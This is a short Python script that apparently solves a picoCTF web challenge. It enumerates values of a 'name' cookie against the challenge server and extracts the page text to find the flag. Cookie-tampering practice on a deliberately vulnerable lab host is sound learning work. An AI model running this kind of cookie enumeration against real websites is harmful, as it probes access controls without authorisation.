import requests

# ctf: http://mercury.picoctf.net:17781/

# site url
url = "http://mercury.picoctf.net:17781/check"


# loop over values in cookie value
for i in range(1, 20):
    # srtring of value for json
    str_i = str(i)
    # cookie name is 'name'
    cookies = {
        'name': str_i
    }
    r = requests.get(url, cookies=cookies)
    # r.text gives full source code for each cookie value (for cookies 'name')
    # print(r.text)
    # split the result of source code for the value in the <b> in paragraph
    result = r.text.split("<p style=\"text-align:center; font-size:30px;\"><b>")[1].split("</b>")[0]

    # print value of paragraph to see if flag is there
    print(f"cookie: {str_i} result: {result}")